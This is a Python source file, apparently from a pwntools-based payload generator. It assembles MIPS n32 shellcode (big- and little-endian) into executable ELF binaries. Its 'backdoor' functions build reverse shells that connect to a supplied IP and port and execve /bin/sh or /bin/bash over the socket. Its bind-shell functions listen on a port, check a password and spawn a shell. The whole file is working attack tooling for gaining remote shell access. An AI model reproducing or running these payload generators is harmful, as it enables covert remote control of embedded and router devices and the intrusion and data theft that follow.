from pwn import *
from . import my_package
#import my_package
import subprocess
from colorama import Fore,Back,Style

chars = my_package.chars


'''
mipsn32 backdoor
add 2023.2.26
socket 1798
connect 0x1799
dup2 0x1790
execve 0x0017a9
'''


def mipsn32_backdoor(shell_path ,reverse_ip,reverse_port, envp ,filename=None):
    context.architectures['mipsn32'] = {'endian': 'big', 'bits': 32}
    context.arch = 'mipsn32'
    context.endian = "big"
    context.bits = "32"
    if(my_package.get_mipsn32_binutils(context.arch) == 1):
        return 
    log.success("reverse_ip is: "+ reverse_ip)
    log.success("reverse_port is: "+str(reverse_port))
    reverse_port = int(hex(reverse_port), 16)
    reverse_port = hex(0x10000 - int("0x" + enhex(p16(reverse_port)), 16) - 1)
    reverse_ip = list(reverse_ip.split("."))
    reverse_ip_high = hex(0x10000 - ((int(reverse_ip[0]) << 8) + int(reverse_ip[1])) - 1)
    # print(reverse_ip_high)
    # print((int(reverse_ip[1])<<8)+int(reverse_ip[0]))
    # print(reverse_ip_high)
    reverse_ip_low = hex(0x10000 - ((int(reverse_ip[2]) << 8) + int(reverse_ip[3])) - 1)
    shellcode = """
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
    """
    shellcode_connect = '''
li      $t9, -3
nor     $a0, $t9, $zero
li      $t9, -3
nor     $a1, $t9, $zero
slti    $a2, $zero, -1
li      $v0, 0x1798
syscall 0x40404
sw      $v0, -4($sp)
lw      $s0, -4($sp)
lui     $t9, 0xfffd
ori     $t9, $t9, %s
nor     $t1, $t9, $zero
sw      $t1, -8($sp)
lui     $t9, %s
ori     $t9, $t9, %s
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu  $sp, $sp, -8
sw      $s0, -4($sp)
lw      $a0, -4($sp)
move     $a1,$sp
li      $t9, -17
nor     $a2, $t9, $zero
li      $v0, 0x1799
syscall 0x40404
    '''
    shellcode_connect=shellcode_connect%(reverse_port,reverse_ip_high,reverse_ip_low)

    shellcode_dup_sh='''
move $a0,$s0
nor $a1,$zero,-1
li  $v0,0x1790
syscall 0x40404
move $a0,$s0
li  $t9,-2
nor $a1,$t9,$zero
li  $v0,0x1790
syscall 0x40404
move $a0,$s0
li  $t9,-3
nor $a1,$t9,$zero
li  $v0,0x1790
syscall 0x40404
	'''
    if shell_path == "/bin/sh" or shell_path == "sh":
        shellcode_execve = """
lui     $t1, 0x2f62
ori     $t1, $t1, 0x696e
sw      $t1, -8($sp)
lui     $t9, 0xd08c
ori     $t9, $t9, 0x97ff
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu   $sp, $sp, -8
add     $a0, $sp, $zero
lui     $t1, 0x2f62
ori     $t1, $t1, 0x696e
sw      $t1, -12($sp)
lui     $t9, 0xd08c
ori     $t9, $t9, 0x97ff
nor     $t1, $t9, $zero
sw      $t1, -8($sp)
lui     $t9, 0xd296
ori     $t9, $t9, 0xffff
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu   $sp, $sp, -12
slti    $a1, $zero, -1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -13
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -9
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
add     $a1, $sp, $zero
slti    $a2, $zero, -1
li      $v0, 0x0017a9
syscall 0x40404
        """

    elif shell_path == "/bin/bash" or shell_path == "bash":
        shellcode_execve = """
lui     $t1, 0x2f62
ori     $t1, $t1, 0x696e
sw      $t1, -12($sp)
lui     $t1, 0x2f62
ori     $t1, $t1, 0x6173
sw      $t1, -8($sp)
lui     $t9, 0x97ff
ori     $t9, $t9, 0xffff
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu   $sp, $sp, -12
add     $a0, $sp, $zero
lui     $t1, 0x2f62
ori     $t1, $t1, 0x696e
sw      $t1, -16($sp)
lui     $t1, 0x2f62
ori     $t1, $t1, 0x6173
sw      $t1, -12($sp)
lui     $t9, 0x97ff
ori     $t9, $t9, 0xd296
nor     $t1, $t9, $zero
sw      $t1, -8($sp)
sw      $zero, -4($sp)
addiu   $sp, $sp, -16
slti    $a1, $zero, -1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -15
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -9
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
add     $a1, $sp, $zero
slti    $a2, $zero, -1
li      $v0, 0x0017a9
syscall 0x40404
        """

    else:
        log.info("now shell is only support sh and bash")
        return 
    if(envp == None):
        envp = 0
    else:
        envp = my_package.get_envir_args(envp)
    shellcode += shellcode_connect + shellcode_dup_sh +shellcode_execve
    if (filename == None):
        log.info("waiting 3s")
        sleep(1)
        filename=context.arch + "-backdoor-" + my_package.random_string_generator(4,chars)
        my_package.my_make_add_arch_elf(shellcode, filename)
        os.chmod(filename, 0o755)
        log.success("{} is ok in current path ./".format(filename))
        context.arch = 'i386'
        context.bits = "32"
        context.endian = "little"
    else:
        if(os.path.exists(filename) != True):
            log.info("waiting 3s")
            sleep(1)
            my_package.my_make_add_arch_elf(shellcode, filename)
            log.success("{} generated successfully".format(filename))
            context.arch='i386'
            context.bits="32"
            context.endian="little"
            return 
        else:
            print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
            choise = input()
            if choise == "y\n" or choise == "\n":
                log.info("waiting 3s")
                sleep(1)
                my_package.my_make_add_arch_elf(shellcode, filename)
                log.success("{} generated successfully".format(filename))
                context.arch='i386'
                context.bits="32"
                context.endian="little"
                return 
            else:
                return
    #my_package.my_make_add_arch_elf(shellcode)



def mipsn32el_backdoor(shell_path ,reverse_ip,reverse_port, envp ,filename=None):
    context.architectures['mipsn32el'] = {'endian': 'little', 'bits': 32}
    context.arch = 'mipsn32el'
    context.endian = "little"
    context.bits = "32"
    if(my_package.get_mipsn32_binutils(context.arch) == 1):
        return 
    log.success("reverse_ip is: "+ reverse_ip)
    log.success("reverse_port is: "+str(reverse_port))
    reverse_port=int(hex(reverse_port),16)
    reverse_port=hex(0x10000-int("0x"+enhex(p16(reverse_port)),16)-1)
    reverse_ip=list(reverse_ip.split("."))
    reverse_ip_high=hex(0x10000-((int(reverse_ip[1])<<8)+int(reverse_ip[0]))-1)
    #print(reverse_ip_high)
    #print((int(reverse_ip[1])<<8)+int(reverse_ip[0]))
    #print(reverse_ip_high)
    reverse_ip_low=hex(0x10000-((int(reverse_ip[3])<<8)+int(reverse_ip[2]))-1)
    shellcode = """
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
    """
    shellcode_connect='''
li      $t9, -3
nor     $a0, $t9, $zero
li      $t9, -3
nor     $a1, $t9, $zero
slti    $a2, $zero, -1
li      $v0, 0x1798
syscall 0x40404
sw      $v0, -4($sp)
lw      $s0, -4($sp)
lui     $t9, %s
ori     $t9, $t9, 0xfffd
nor     $t1, $t9, $zero
sw      $t1, -8($sp)
lui     $t9, %s
ori     $t9, $t9, %s
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu  $sp, $sp, -8
sw      $s0, -4($sp)
lw      $a0, -4($sp)
move     $a1,$sp
li      $t9, -17
nor     $a2, $t9, $zero
li      $v0, 0x1799
syscall 0x40404
    '''
    shellcode_connect=shellcode_connect%(reverse_port,reverse_ip_low,reverse_ip_high)
    shellcode_dup_sh='''
move $a0,$s0
nor $a1,$zero,-1
li  $v0,0x1790
syscall 0x40404
move $a0,$s0
li  $t9,-2
nor $a1,$t9,$zero
li  $v0,0x1790
syscall 0x40404
move $a0,$s0
li  $t9,-3
nor $a1,$t9,$zero
li  $v0,0x1790
syscall 0x40404
    '''
    if shell_path == "/bin/sh" or shell_path=="sh":
        shellcode_execve = """
lui     $t1, 0x6e69
ori     $t1, $t1, 0x622f
sw      $t1, -8($sp)
lui     $t9, 0xff97
ori     $t9, $t9, 0x8cd0
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu   $sp, $sp, -8
add     $a0, $sp, $zero
lui     $t1, 0x6e69
ori     $t1, $t1, 0x622f
sw      $t1, -12($sp)
lui     $t9, 0xff97
ori     $t9, $t9, 0x8cd0
nor     $t1, $t9, $zero
sw      $t1, -8($sp)
li      $t1, 0x692d
sw      $t1, -4($sp)
addiu   $sp, $sp, -12
slti    $a1, $zero, -1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -13
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -9
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
add     $a1, $sp, $zero
slti    $a2, $zero, -1
li      $v0, 0x0017a9
syscall 0x40404
        """
    elif shell_path == "/bin/bash" or shell_path == "bash":
        shellcode_execve = """
lui     $t1, 0x6e69
ori     $t1, $t1, 0x622f
sw      $t1, -12($sp)
lui     $t1, 0x7361
ori     $t1, $t1, 0x622f
sw      $t1, -8($sp)
li      $t9, -105
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu   $sp, $sp, -12
add     $a0, $sp, $zero
lui     $t1, 0x6e69
ori     $t1, $t1, 0x622f
sw      $t1, -16($sp)
lui     $t1, 0x7361
ori     $t1, $t1, 0x622f
sw      $t1, -12($sp)
lui     $t9, 0x96d2
ori     $t9, $t9, 0xff97
nor     $t1, $t9, $zero
sw      $t1, -8($sp)
sw      $zero, -4($sp)
addiu   $sp, $sp, -16
slti    $a1, $zero, -1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -15
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -9
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
add     $a1, $sp, $zero
slti    $a2, $zero, -1
li      $v0, 0x0017a9
syscall 0x40404
        """
    else:
        log.info("now shell is only support sh and bash")
        return 
    if(envp == None):
        envp = 0
    else:
        envp = my_package.get_envir_args(envp)

    shellcode += shellcode_connect + shellcode_dup_sh +shellcode_execve
    if (filename == None):
        log.info("waiting 3s")
        sleep(1)
        filename=context.arch + "-backdoor-" + my_package.random_string_generator(4,chars)
        my_package.my_make_add_arch_elf(shellcode, filename)
        os.chmod(filename, 0o755)
        log.success("{} is ok in current path ./".format(filename))
        context.arch = 'i386'
        context.bits = "32"
        context.endian = "little"
    else:
        if(os.path.exists(filename) != True):
            log.info("waiting 3s")
            sleep(1)
            my_package.my_make_add_arch_elf(shellcode, filename)
            log.success("{} generated successfully".format(filename))
            context.arch='i386'
            context.bits="32"
            context.endian="little"
            return 
        else:
            print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
            choise = input()
            if choise == "y\n" or choise == "\n":
                log.info("waiting 3s")
                sleep(1)
                my_package.my_make_add_arch_elf(shellcode, filename)
                log.success("{} generated successfully".format(filename))
                context.arch='i386'
                context.bits="32"
                context.endian="little"
                return 
            else:
                return
            
"""
0x0017a0 bind
0x0017a1 listen
0x00179a accept
socket 1798
connect 0x1799
dup2 0x1790
execve 0x0017a9
write 0x001771
read 0x001770
"""


def mipsn32_bind_shell(listen_port, passwd, filename=None):
    context.architectures['mipsn32'] = {'endian': 'big', 'bits': 32}
    context.arch = 'mipsn32'
    context.endian = "big"
    context.bits = "32"
    if(my_package.get_mipsn32_binutils(context.arch) == 1):
        return 
    log.success("bind port is set to "+ str(listen_port))
    log.success("passwd is set to '%s'"%passwd )
    listen_port = '0x'+enhex(p16(listen_port))
    passwd_len = len(passwd)
    passwd = "0x"+enhex(p32(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(8,"0")
    shellcode = """
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
    """
    shellcode_socket = '''
    li      $t9, -3
    nor     $a0, $t9, $zero
    li      $t9, -3
    nor     $a1, $t9, $zero
    slti    $a2, $zero, -1
    li      $v0, 0x1798
    syscall 0x40404
    '''

    shellcode += shellcode_socket

    shellcode += '''
    move $s7, $v0
    '''

# setsockopt

#    shellcode += '''
#    li      $v0, 1
#    sw      $v0, 0($sp)
#    move    $v1, $sp
#    sw      $s7, 4($sp)
#    li      $a4, 4
#    move    $a3, $v1
#    li      $a2, 512
#    li      $a1, 0xffff
#    move    $a0, $s7
#    li      $v0, 5053
#    syscall 0x40404
#    '''

    shellcode +='''
    li      $t3,0x7350
    andi    $s0,$v0,0xffff
    li      $t2,-17
    nor     $t2,$t2,$zero
    li      $t1, -3
    nor     $t1,$t1,$zero
    sllv    $t1,$t1,$t2
    li      $t2,%s
    or      $t1,$t1,$t2
    sw      $t1,-32($sp)
    sw      $zero,-28($sp)
    sw      $zero,-24($sp)
    sw      $zero,-20($sp)
    move     $a0, $s7
    li      $t2,-17
    nor     $a2,$t2,$zero
    daddi   $a1,$sp,-32
    li      $v0,0x0017a0
    syscall 0x40404
    li      $t3,0x7350
    move     $a0, $s7
    li      $a1,2
    li      $v0,0x0017a1
    syscall
    li      $t3,0x7350
    move    $a0, $s7
    slti    $a1,$zero,-1
    slti    $a2,$zero,-1
    li      $v0,0x00179a
    syscall
    move    $s7, $v0 
    li      $t3,0x7350
    andi    $s0,$v0,0xffff
    or      $a0,$s0,$s0 
    li      $t2,-3 
    nor     $a1,$t2,$zero 
    li      $v0,0x1790
    syscall
    li      $t3,0x7350
    or      $a0,$s0,$s0
    slti    $a1,$zero,0x0101
    li      $v0,0x1790
    syscall
    li      $t3,0x7350
    or      $a0,$s0,$s0
    slti    $a1,$zero,-1
    li      $v0,0x1790
    syscall
    '''

    shellcode = shellcode%(listen_port)


    shellcode += '''

lui     $t1, 0x5061
ori     $t1, $t1, 0x7373
sw      $t1, -8($sp)
lui     $t9, 0x889b
ori     $t9, $t9, 0xc5ff
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu   $sp, $sp, -8
add     $a1, $sp, $zero
sw      $s7, -4($sp)
lw      $a0, -4($sp)
li      $t9, -9
nor     $a2, $t9, $zero
li      $v0, 0x001771
syscall 0x40404
sw      $s7, -4($sp)
lw      $a0, -4($sp)
li      $t9, %d
nor     $a2, $t9, $zero
add     $a1, $sp, $zero
li      $v0, 0x001770
syscall 0x40404
li $s3, %s
lw $s1, ($sp)
bne  $s1, $s3, main_exit
nop
    '''	

    shellcode = shellcode%(~passwd_len, passwd)


#    if shell_path == "/bin/sh" or shell_path == "sh":
    shellcode_execve = """
lui     $t1, 0x2f62
ori     $t1, $t1, 0x696e
sw      $t1, -8($sp)
lui     $t9, 0xd08c
ori     $t9, $t9, 0x97ff
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu   $sp, $sp, -8
add     $a0, $sp, $zero
lui     $t1, 0x2f62
ori     $t1, $t1, 0x696e
sw      $t1, -12($sp)
lui     $t9, 0xd08c
ori     $t9, $t9, 0x97ff
nor     $t1, $t9, $zero
sw      $t1, -8($sp)
lui     $t9, 0xd296
ori     $t9, $t9, 0xffff
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu   $sp, $sp, -12
slti    $a1, $zero, -1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -13
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -9
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
add     $a1, $sp, $zero
slti    $a2, $zero, -1
li      $v0, 0x0017a9
syscall 0x40404
        """
    '''
    elif shell_path == "/bin/bash" or shell_path == "bash":
        shellcode_execve = """
lui     $t1, 0x2f62
ori     $t1, $t1, 0x696e
sw      $t1, -12($sp)
lui     $t1, 0x2f62
ori     $t1, $t1, 0x6173
sw      $t1, -8($sp)
lui     $t9, 0x97ff
ori     $t9, $t9, 0xffff
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu   $sp, $sp, -12
add     $a0, $sp, $zero
lui     $t1, 0x2f62
ori     $t1, $t1, 0x696e
sw      $t1, -16($sp)
lui     $t1, 0x2f62
ori     $t1, $t1, 0x6173
sw      $t1, -12($sp)
lui     $t9, 0x97ff
ori     $t9, $t9, 0xd296
nor     $t1, $t9, $zero
sw      $t1, -8($sp)
sw      $zero, -4($sp)
addiu   $sp, $sp, -16
slti    $a1, $zero, -1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -15
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -9
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
add     $a1, $sp, $zero
slti    $a2, $zero, -1
li      $v0, 0x0017a9
syscall 0x40404
        """
    '''
    
    shellcode += shellcode_execve

    shellcode += '''
    main_exit:
    xor $a0, $a0, $a0
    li  $v0, 0x01455
    syscall
    '''
    if (filename == None):
        log.info("waiting 3s")
        sleep(1)
        filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
        my_package.my_make_add_arch_elf(shellcode, filename)
        os.chmod(filename, 0o755)
        log.success("{} is ok in current path ./".format(filename))
        context.arch = 'i386'
        context.bits = "32"
        context.endian = "little"
    else:
        if(os.path.exists(filename) != True):
            log.info("waiting 3s")
            sleep(1)
            my_package.my_make_add_arch_elf(shellcode, filename)
            log.success("{} generated successfully".format(filename))
            context.arch='i386'
            context.bits="32"
            context.endian="little"
            return 
        else:
            print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
            choise = input()
            if choise == "y\n" or choise == "\n":
                log.info("waiting 3s")
                sleep(1)
                my_package.my_make_add_arch_elf(shellcode, filename)
                log.success("{} generated successfully".format(filename))
                context.arch='i386'
                context.bits="32"
                context.endian="little"
                return 
            else:
                return
            


"""
0x0017a0 bind
0x0017a1 listen
0x00179a accept
socket 1798
connect 0x1799
dup2 0x1790
execve 0x0017a9
write 0x001771
read 0x001770
"""

def mipsn32el_bind_shell(listen_port, passwd, filename=None):
    context.architectures['mipsn32el'] = {'endian': 'little', 'bits': 32}
    context.arch = 'mipsn32el'
    context.endian = "little"
    context.bits = "32"
    if(my_package.get_mipsn32_binutils(context.arch) == 1):
        return 
    log.success("bind port is set to "+ str(listen_port))
    log.success("passwd is set to '%s'"%passwd )
    listen_port = '0x'+enhex(p16(listen_port))
    passwd_len = len(passwd)
    passwd = "0x"+enhex(p32(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(8,"0")
    shellcode = """
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
    """
    shellcode_socket = '''
    li      $t9, -3
    nor     $a0, $t9, $zero
    li      $t9, -3
    nor     $a1, $t9, $zero
    slti    $a2, $zero, -1
    li      $v0, 0x1798
    syscall 0x40404
    '''

    shellcode += shellcode_socket

    shellcode += '''
    move $s7, $v0
    '''
    
    shellcode += '''
li      $t3,0x7350
andi    $s0,$v0,0xffff
li      $t2,-17
nor     $t2,$t2,$zero
li      $t1, %s
sllv    $t1,$t1,$t2
li      $t2,-3
nor     $t2,$t2,$zero
or      $t1,$t1,$t2
sw      $t1,-32($sp)
sw      $zero,-28($sp)
sw      $zero,-24($sp)
sw      $zero,-20($sp)
move    $a0, $s7
li      $t2,-17
nor     $a2,$t2,$zero
daddi   $a1,$sp,-32
li      $v0,0x0017a0
syscall 0x40404
li      $t3,0x7350
move    $a0, $s7
li      $a1,2
li      $v0,0x0017a1
syscall
li      $t3,0x7350
move    $a0, $s7
slti    $a1,$zero,-1
slti    $a2,$zero,-1
li      $v0,0x00179a
syscall
move $s7, $v0
li      $t3,0x7350
andi    $s0,$v0,0xffff
or      $a0,$s0,$s0 
li      $t2,-3 
nor     $a1,$t2,$zero 
li      $v0,0x1790
syscall
li      $t3,0x7350
or      $a0,$s0,$s0
slti    $a1,$zero,0x0101
li      $v0,0x1790
syscall
li      $t3,0x7350
or      $a0,$s0,$s0
slti    $a1,$zero,-1
li      $v0,0x1790
syscall
    '''
    
    shellcode = shellcode%(listen_port)
    

    shellcode += '''
lui     $t1, 0x7373
ori     $t1, $t1, 0x6150
sw      $t1, -8($sp)
lui     $t9, 0xffc5
ori     $t9, $t9, 0x9b88
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu   $sp, $sp, -8
add     $a1, $sp, $zero
add     $a0, $s7, $zero
li      $t9, -9
nor     $a2, $t9, $zero
li      $v0, 0x001771
syscall 0x40404
sw      $s7, -4($sp)
lw      $a0, -4($sp)
li      $t9, %d
nor     $a2, $t9, $zero
add     $a1, $sp, $zero
li      $v0, 0x001770
syscall 0x40404
li $s3, %s
lw $s1, ($sp)
bne  $s1, $s3, main_exit
nop
    '''	
    
    shellcode = shellcode%(~passwd_len, passwd)
    
    shellcode_execve = """
lui     $t1, 0x6e69
ori     $t1, $t1, 0x622f
sw      $t1, -8($sp)
lui     $t9, 0xff97
ori     $t9, $t9, 0x8cd0
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu   $sp, $sp, -8
add     $a0, $sp, $zero
lui     $t1, 0x6e69
ori     $t1, $t1, 0x622f
sw      $t1, -12($sp)
lui     $t9, 0xff97
ori     $t9, $t9, 0x8cd0
nor     $t1, $t9, $zero
sw      $t1, -8($sp)
li      $t1, 0x692d
sw      $t1, -4($sp)
addiu   $sp, $sp, -12
slti    $a1, $zero, -1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -13
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -9
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
add     $a1, $sp, $zero
slti    $a2, $zero, -1
li      $v0, 0x0017a9
syscall 0x40404
        """
    
    
    shellcode += shellcode_execve

    shellcode += '''
    main_exit:
    xor $a0, $a0, $a0
    li  $v0, 0x01455
    syscall
    '''
    if (filename == None):
        log.info("waiting 3s")
        sleep(1)
        filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
        my_package.my_make_add_arch_elf(shellcode, filename)
        os.chmod(filename, 0o755)
        log.success("{} is ok in current path ./".format(filename))
        context.arch = 'i386'
        context.bits = "32"
        context.endian = "little"
    else:
        if(os.path.exists(filename) != True):
            log.info("waiting 3s")
            sleep(1)
            my_package.my_make_add_arch_elf(shellcode, filename)
            log.success("{} generated successfully".format(filename))
            context.arch='i386'
            context.bits="32"
            context.endian="little"
            return 
        else:
            print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
            choise = input()
            if choise == "y\n" or choise == "\n":
                log.info("waiting 3s")
                sleep(1)
                my_package.my_make_add_arch_elf(shellcode, filename)
                log.success("{} generated successfully".format(filename))
                context.arch='i386'
                context.bits="32"
                context.endian="little"
                return 
            else:
                return

#mipsn32_backdoor("sh", "127.0.0.1", 8888, None,)